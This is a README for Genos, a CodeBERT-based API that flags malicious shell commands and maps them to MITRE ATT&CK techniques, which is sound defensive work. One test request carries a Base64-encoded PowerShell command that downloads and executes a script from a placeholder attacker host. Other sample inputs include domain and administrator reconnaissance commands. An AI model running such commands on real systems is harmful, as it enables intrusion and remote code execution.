# Genos API

Genos is a two-stage neural pipeline for real-time malicious command detection and MITRE ATT&CK technique attribution, served as a REST API over Gunicorn and Flask.

The system was developed as part of an IEEE research programme. This README is derived directly from the source code (`engine.py`, `app.py`, `gunicorn.conf.py`) and reflects the current behaviour of the `main` branch only.

---

## How the engine works

The core inference logic lives in `engine.py`. The Flask API in `app.py` wraps it.

### Startup

When the process starts:

1. `python-dotenv` loads `.env` from the working directory.
2. `GenosEngine` is constructed once — no hot-reloading of models.
3. The engine resolves its asset paths in this order for each file:
   - absolute path (if given)
   - relative to `os.getcwd()`
   - relative to the directory containing `engine.py`
   - each fallback candidate in turn
4. The specialist label map is loaded from the first file that exists:
   - `map_path` argument passed by the caller
   - `config/specialist_map.json` ← current live path
   - `models/specialist_map.json`
   - If none found: built dynamically by reading `mitre_id` values from the raw MITRE CSV and sorting them
5. `RobertaTokenizer` is loaded from `microsoft/codebert-base` (downloaded on first run, cached by HuggingFace).
6. Both model checkpoints are loaded with `torch.load(..., weights_only=True)`.
7. The app calls `engine.scan("warmup")` before accepting traffic; `/health` returns `{"status": "ok"}` once this completes.

### Deobfuscation pipeline

Before tokenisation, `scan()` applies an entropy-aware deobfuscation loop. A command is treated as obfuscated if it matches any of these patterns (case-insensitive regex) or if its Shannon entropy exceeds **5.2 bits**:

| Pattern | What it catches |
|---|---|
| `\[char\]` | PowerShell character-code constructions |
| `base64` / `frombase64` | Inline Base64 references |
| `reverse\(` | String reversal wrappers |
| `\+[ ]*'` | String concatenation fragments |
| `\$[a-z0-9_]{10,}` | Long obfuscated variable names |
| `\\x[0-9a-f]{2}` | Hex byte escapes |

If obfuscated, the engine runs up to **5 deobfuscation passes**. Each pass applies, in order:

1. **`universal_decoder`** — decodes the whole string if it matches a bare Base64 regex
2. **`decode_embedded_base64`** — decodes `FromBase64String('...')` payloads inline
3. **`extract_powershell_payload`** — extracts the payload from `&(builder)(payload)` invocation wrappers, including `[System.Text.Encoding]::UTF8.GetString(...)` variants
4. **`deobfuscate_char_constructions`** — resolves `[char]65`, `(65..67) | % { [char]$_ }`, and mixed range+bareword patterns into literal characters
5. **`clean_concatenation`** — collapses `"ab" + "cd"` and `"ab" + bareword` forms
6. **`pyminusone.deobfuscate(..., lang="powershell")`** — optional AST-level simplification if `pyminusone` is installed; silently skipped otherwise
7. Runs char and concatenation passes again after any AST simplification

The loop terminates early when:
- a pass produces no change in the text
- the absolute entropy delta between passes is less than `0.01` bits

After the loop, the processed command is **lowercased and stripped** before tokenisation.

### Tokenisation

Uses `RobertaTokenizer` from `microsoft/codebert-base`:

- `max_length`: `256` (override with `GENOS_MAX_TOKENS` env var)
- `padding`: `max_length`
- `truncation`: enabled
- `return_tensors`: `"pt"`

### Tier 1 — Gatekeeper (binary classifier)

Architecture:

```
CodeBERT CLS token (768-d)
→ Dropout(0.2)
→ Linear(768, 1024)
→ GELU
→ Dropout(0.2)
→ Linear(1024, 2)
```

Inference runs under `torch.no_grad()` and `torch.amp.autocast`:
- CUDA device: `float16`
- CPU device: `bfloat16`

`softmax(logits)` → `argmax` → `"Benign"` (index 0) or `"Malicious"` (index 1). Confidence is the raw softmax probability multiplied by 100 (percentage, 2 d.p.).

If the prediction is **Benign**, inference stops here and the result is returned immediately.

### Tier 2 — Specialist (MITRE attribution)

Only runs when Tier 1 predicts Malicious.

Architecture:

```
CodeBERT CLS token (768-d)
→ Linear(768, 1024)
→ LayerNorm(1024)
→ GELU
→ Dropout(0.3)
→ Linear(1024, 1024)
→ GELU
→ Linear(1024, num_classes)
```

`num_classes` comes from the loaded specialist label map (108 classes in the current `config/specialist_map.json`).

Temperature scaling is applied before softmax: `softmax(logits / 0.5)`. Temperature `T=0.5` sharpens the distribution, concentrating probability mass on the top predictions.

The top **5** predictions by probability are returned.

### Engine output schema

`GenosEngine.scan()` returns:

```json
{
  "label": "Malicious",
  "label_confidence": 99.81,
  "deobfuscated_cmd": "invoke-expression ...",
  "MITRE_codes": [
    { "code": "T1059", "confidence": 97.43 },
    { "code": "T1021", "confidence": 1.22 },
    { "code": "T1078", "confidence": 0.81 },
    { "code": "T1003", "confidence": 0.48 },
    { "code": "T1087", "confidence": 0.06 }
  ]
}
```

Notes:
- `label_confidence` is a percentage with 2 decimal places
- `deobfuscated_cmd` is only populated when the input was flagged as obfuscated; it is `null` otherwise
- `MITRE_codes` is an empty array for benign results
- `label_confidence` is already a percentage when it leaves the engine; `app.py`'s `_to_percentage()` normalises legacy values that arrived as raw probabilities (0–1) for backward compatibility

---

## Models

Both models share the `microsoft/codebert-base` encoder (RoBERTa pre-trained on code, 768-d hidden states). Weights are loaded once at startup and kept resident for the lifetime of the process.

| File | Purpose |
|---|---|
| `models/gatekeeper.pt` | Tier 1 binary classifier |
| `models/specialist.pt` | Tier 2 MITRE attribution classifier |
| `config/specialist_map.json` | Maps integer class indices to MITRE technique IDs |

Model weights and large training artefacts are tracked with Git LFS (`.gitattributes`).

---

## API

Served by Gunicorn on `127.0.0.1:6001` by default.

### `GET /health`

```json
{ "status": "ok" }
```

Returns `"loading"` if the engine warm-up has not yet completed.

### `POST /scan` — MongoDB-authenticated

Requires a running MongoDB instance configured via `MONGO_URI`. API keys are stored in the `genos.api_keys` collection; usage is tracked in `genos.usage`.

Request:

```json
{
  "api_key": "YOUR_KEY",
  "command": "net user /domain"
}
```

The API key is read from the JSON body, **not** from a header. The command may be plain text or a Base64-encoded string; `app.py` attempts a full Base64 decode before passing to the engine, falling back to plain text if decode fails.

Response (malicious):

```json
{
  "label": "Malicious",
  "label_confidence": 99.81,
  "MITRE_codes": [
    { "code": "T1087", "confidence": 97.43 },
    { "code": "T1069", "confidence": 1.22 }
  ]
}
```

Response (benign):

```json
{
  "label": "Benign",
  "label_confidence": 99.99,
  "MITRE_codes": []
}
```

Error responses:

| Status | Meaning |
|---|---|
| `400` | Missing `api_key` or `command` |
| `401` | API key not found in MongoDB |
| `500` | Engine error |
| `503` | `MONGO_URI` not configured |

### `POST /scan/internal` — token-gated, no database

Intended for local testing, CI, and benchmark scripts where MongoDB is not required.

Request:

```json
{
  "command": "whoami",
  "internal_token": "optional"
}
```

`internal_token` is only enforced when `INTERNAL_TEST_TOKEN` is set in the environment. Omit the field entirely when the env var is unset.

Response shape is identical to `/scan`.

---

## Setup and venv

### Create a fresh virtual environment

Always use a dedicated `venv` rather than the system Python or any checked-in environment directory. The project `.gitignore` already excludes `venv/` and `my_flask_env/`.

```bash
cd genos_api
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip setuptools wheel
```

Use `.venv` (or any name that `.gitignore` covers) rather than `venv` if you want the directory ignored automatically. The existing `.gitignore` entry covers `venv/` literally.

### Install dependencies

```bash
pip install -r requirements.txt
```

**PyTorch and CUDA:** `requirements.txt` pins the major/minor version of PyTorch but not the CUDA wheel suffix, because the suffix is machine-specific. If you need a specific CUDA build, install it first from the official index before running the above:

```bash
# Example: CUDA 12.1 build
pip install torch==2.5.1+cu121 --index-url https://download.pytorch.org/whl/cu121
pip install -r requirements.txt
```

CPU-only inference works without any CUDA toolkit; the engine auto-detects the device and uses `bfloat16` autocast on CPU.

**Optional — PowerShell deobfuscation enhancement:**

```bash
pip install pyminusone
```

If `pyminusone` is not installed the engine falls back to its built-in deobfuscation rules silently.

### Configure environment

```bash
cp .env.example .env
# edit .env with your values
```

---

## Environment variables

| Variable | Used in | Default | Purpose |
|---|---|---|---|
| `MONGO_URI` | `app.py` | — | Connection string for MongoDB; enables `/scan` route |
| `INTERNAL_TEST_TOKEN` | `app.py` | — | Optional auth token for `/scan/internal`; unenforced if unset |
| `GENOS_API_BIND` | `gunicorn.conf.py` | `127.0.0.1:6001` | Gunicorn bind address |
| `GENOS_MAX_TOKENS` | `engine.py` | `256` | Tokeniser max sequence length |
| `CURRENT_TIME` | `app.py` | `"2026-03-17T00:00:00.000+00:00"` | Timestamp written into Mongo usage records |
| `GENOS_T1_EFFECTIVE_BATCH` | `trainer1.py` | `256` | Training only: effective batch size |
| `GENOS_T1_MICRO_BATCH` | `trainer1.py` | `32` | Training only: micro-batch size for gradient accumulation |
| `GENOS_T1_USE_COMPILE` | `trainer1.py` | `0` | Training only: set `1` to enable `torch.compile()` |

---

## Running locally

### Start the API

```bash
source .venv/bin/activate
gunicorn -c gunicorn.conf.py app:app
```

The worker loads both CodeBERT models and runs a warm-up pass before accepting traffic. The 300 s Gunicorn timeout covers this load time. On a machine with a GPU and the model weights already cached locally, startup typically takes under 60 s.

### Test without MongoDB

```bash
curl -s http://127.0.0.1:6001/health

curl -s -X POST http://127.0.0.1:6001/scan/internal \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

curl -s -X POST http://127.0.0.1:6001/scan/internal \
  -H "Content-Type: application/json" \
  -d '{"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAG0AYQBsAHcAYQByAGUALgBzAGgAIAB8ACAASQBFAFgA"}'
```

### Reload an already-running instance

```bash
bash scripts/ops/reload_api.sh reload   # stop → start → health check
bash scripts/ops/reload_api.sh status   # check /health
```

The reload script is hardcoded to `127.0.0.1:6001` and activates `venv/bin/activate` relative to the project root.

### Run the engine directly from Python

```python
import sys
sys.path.insert(0, "/path/to/genos_api")

from engine import GenosEngine

engine = GenosEngine()
result = engine.scan("net localgroup administrators")
print(result)
```

---

## Deployment

### Gunicorn configuration (`gunicorn.conf.py`)

| Setting | Value | Reason |
|---|---|---|
| `bind` | `127.0.0.1:6001` | Loopback only; expose via reverse proxy |
| `workers` | `1` | One model copy in GPU memory; more workers multiplies VRAM usage |
| `worker_class` | `sync` | CUDA cannot survive a post-fork environment |
| `timeout` | `300` | Covers model loading on startup |
| `preload_app` | not set | Omitted deliberately; pre-loading would fork after CUDA initialisation |

### Reverse proxy (recommended)

Run Gunicorn on localhost and expose Nginx (or Caddy) publicly. Never bind Gunicorn directly to `0.0.0.0` in production without a reverse proxy.

Minimal Nginx location block:

```nginx
location /scan {
    proxy_pass http://127.0.0.1:6001;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_read_timeout 60s;
}
```

### systemd unit

```ini
[Unit]
Description=Genos API
After=network.target

[Service]
Type=simple
User=genos
WorkingDirectory=/opt/genos_api
EnvironmentFile=/opt/genos_api/.env
ExecStart=/opt/genos_api/.venv/bin/gunicorn -c gunicorn.conf.py app:app
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

---

## Benchmarking and research tooling

### IEEE pipeline benchmark (`scripts/benchmark/ieee.py`)

Runs a deployment-aligned evaluation comparing the Genos neural pipeline against a TF-IDF + Random Forest baseline.

```bash
cd genos_api
python scripts/benchmark/ieee.py
```

Metrics reported: Tier 1 AUC, precision, recall, F1; Tier 2 top-1 / top-3 accuracy; macro F1; deobfuscation time; end-to-end latency at multiple benign traffic ratios; ROC curve saved to `logs/`.

### Async stress test (`scripts/benchmark/internal_api_test.py`)

Hits the live API with configurable concurrency. Defaults: 500 requests, 50 % malicious, 20 concurrent workers, 85 % confidence threshold.

```bash
# Requires API running on 127.0.0.1:6001
python scripts/benchmark/internal_api_test.py
```

Results are written to `live_stress_report.txt`.

### Training scripts

| Script | Purpose |
|---|---|
| `scripts/training/trainer1.py` | Train the Tier 1 Gatekeeper binary classifier |
| `scripts/training/trainer2_hybrid.py` | Train the Tier 2 Specialist MITRE attribution classifier |
| `scripts/training/trainer_tfidf.py` | Train the TF-IDF baseline classifier |
| `scripts/data/synthesize_gatekeeper_data.py` | Synthesize gatekeeper training data |
| `scripts/data/augment_context_sensitivity.py` | Context-sensitivity augmentation |
| `scripts/data/data_scraper.py` | Raw data collection |

Training data lives in `data/training/genos_dataset/`. Trainers read from the CSVs with the schema `command` (string), `mitre_id` (string — `"Benign"` or a MITRE technique ID such as `T1059`). Hybrid trainers additionally read from the JSONL files in the same directory.

---

## Repository layout

```
app.py                              Flask application and route handling
engine.py                           GenosEngine — deobfuscation and two-tier inference
gunicorn.conf.py                    Gunicorn runtime configuration
requirements.txt                    Python dependencies
reqs.txt                            Alias: -r requirements.txt
.env.example                        Environment variable template

config/
  specialist_map.json               Active 108-class MITRE technique → integer label map
  definitive_mitre_map.json         Full MITRE technique reference
  label_map.json                    Human-readable label definitions
  meta/                             Training run metadata and backups (not loaded at runtime)
    gatekeeper_meta.json
    specialist_meta.json
    specialist_residual_a_meta.json
    specialist_residual_b_meta.json
    specialist_map_108.json.bak
    ...

models/
  gatekeeper.pt                     Tier 1 binary classifier — active weights (Git LFS)
  specialist.pt                     Tier 2 MITRE attribution — active weights (Git LFS)
  archive/                          Historical and experimental checkpoints (Git LFS)
    gatekeeper_pre_augment.pt
    gatekeeper_pre_context_augment.pt
    specialist_residual_a.pt
    specialist_residual_b.pt
    specialist_tfidf_char_rf.pkl
    specialist_tfidf_rf.pkl

data/training/
  genos_dataset/                    Primary train / val / test splits (CSV)
    gatekeeper_train.csv            Benign + malicious — Gatekeeper training
    gatekeeper_val.csv
    gatekeeper_test.csv
    specialist_train.csv            Malicious commands — Specialist training
    specialist_val.csv
    specialist_test.csv
    context_augment_*.csv           Context-augmented variants
    synthetic_gatekeeper_*.csv      Synthetic benign augmentation splits
    hybrid_specialist_*.jsonl       Hybrid JSONL specialist format
    provenance.json                 Dataset build provenance record
  genos_residual/                   Residual variant datasets (JSONL, variants a/b/c)
  genos_residual_cli/               CLI-specific residual datasets
  genos_residual_expanded/          Expanded residual datasets

parser/                             Command parsing and rule engine module
  parser.py                         Main parser entry point
  rule_engine.py                    Rule-based pre-classification
  deobfuscator.py                   Standalone deobfuscation logic
  semantic_features.py              Feature extraction helpers
  candidate_mask.py                 Candidate MITRE label masking
  residual_text.py                  Residual text extraction
  build_*.py                        Dataset builder scripts
  eval_*.py                         Parser evaluation scripts
  validate_*.py                     Validation harnesses
  parser_gold.jsonl                 Gold-label evaluation set
  parser_schema.json                Parser output schema

scripts/
  training/
    trainer1.py                     Gatekeeper training script
    trainer2_hybrid.py              Specialist hybrid training script
    trainer_tfidf.py                TF-IDF baseline training
    generate_cli_specialist_dataset.py  CLI-specific dataset generation
  data/
    augment_context_sensitivity.py  Context-sensitivity augmentation
    data_scraper.py                 Raw data collection
    synthesize_gatekeeper_data.py   Synthetic gatekeeper data generation
  benchmark/
    ieee.py                         IEEE pipeline benchmark (neural vs TF-IDF baseline)
    internal_api_test.py            Async live API stress test
    mitre_benchmark.py              MITRE technique attribution benchmark
    gatekeeper_3class.py            Three-class gatekeeper evaluation
    benign_fp_test.py               False-positive testing on benign traffic
    e2e_llm.py                      End-to-end LLM comparison benchmark
    tfidf_vs_openai.py              TF-IDF vs OpenAI comparison
    test_variant_a_inference.py     Residual variant A inference test
    3class/                         Three-class benchmark results and corpora
  ops/
    reload_api.sh                   Stop → start → health-check helper
    gunicorn.ctl                    Gunicorn process control file

logs/                               Generated benchmark output (gitignored in production)
  ieee_results_*.json               IEEE benchmark result snapshots
  ieee_roc_curve_*.png              ROC curve plots
  mitre_benchmark.json
  gatekeeper_3class_benchmark.json
  tfidf_specialist_results.json
  tfidf_vs_openai.json
  trainer1_balanced.log
  real_world_benign_results.csv
```

---

## Security considerations for public deployment

- `.env` is excluded by `.gitignore`; never commit real secrets
- `/scan` requires a valid API key checked against MongoDB; no unauthenticated inference path exists on that route
- `/scan/internal` bypasses the database and should not be exposed publicly; keep it behind a firewall or protect it with `INTERNAL_TEST_TOKEN`
- Gunicorn is bound to loopback only; the reverse proxy is responsible for TLS termination and rate limiting
- The deobfuscation loop is bounded to 5 passes with an entropy-delta early-exit to prevent deobfuscation bombs from causing unbounded processing
- Model weights are loaded with `weights_only=True` to prevent arbitrary code execution via malicious checkpoint files

---

## Citing this work

If you use Genos in your research, please cite the associated IEEE paper.
